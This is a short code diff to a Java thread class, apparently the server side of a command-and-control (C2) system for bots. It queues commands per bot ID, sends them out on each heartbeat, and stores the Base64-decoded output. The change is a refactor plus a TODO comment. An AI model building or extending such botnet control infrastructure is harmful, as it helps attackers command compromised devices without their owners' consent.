@@ -60,6 +60,7 @@ public class C2ClientThread extends Thread {
                         case "heartbeat":
                             //str should be heartbeat
                             //if it is, fetch command from database
+                            //TODO: make the output scrollable please 🔜 🔜 🔜
                             ArrayList<String> cmds = commandDatabase.getFromDatabase(uuid.toString(), BotEntryContract.BotEntry.command);
                             String command = cmds.get(0);
                             ArrayList<String> outs = commandDatabase.getFromDatabase(uuid.toString(), BotEntryContract.BotEntry.output);
@@ -67,12 +68,9 @@ public class C2ClientThread extends Thread {
                             //if there is a command, send command and readLine for output
                             if (!command.equals("") && outputs != null && !outputs.equals("Success")) {
                                 out.println(command);
-                                String output = in.readLine();
-                                output = new String(Base64.getDecoder().decode(output.getBytes(StandardCharsets.UTF_8)));
-                                Log.e("From client: ", output);
+                                String output = new String(Base64.getDecoder().decode(in.readLine().getBytes(StandardCharsets.UTF_8)));
                                 commandDatabase.updateDatabase(uuid.toString(), "", output);
 
-                                //if there is no command, send "none"
                             } else {
                                 out.println("None");
                             }
